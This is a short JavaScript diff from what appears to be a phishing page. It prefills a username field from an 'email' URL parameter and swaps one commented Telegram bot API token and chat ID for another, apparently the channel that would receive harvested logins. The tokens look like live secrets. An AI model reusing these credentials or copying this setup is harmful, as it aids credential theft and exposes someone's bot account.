@@ -66,5 +66,5 @@ function getParameterByName(name, url = window.location.href) {
     document.getElementById('username').value = getParameterByName('email');
  }
  
-//  apiToken: 6892304308:AAE6xiuUOIGidz0869JygcI8ERGu_NLUIXI
-//  chatId: -4195411085
+//  apiToken: 6724518968:AAFoEyUmaA910VH-GL4FXeTa60bB9BcwVWA
+//  chatId: -6007087659
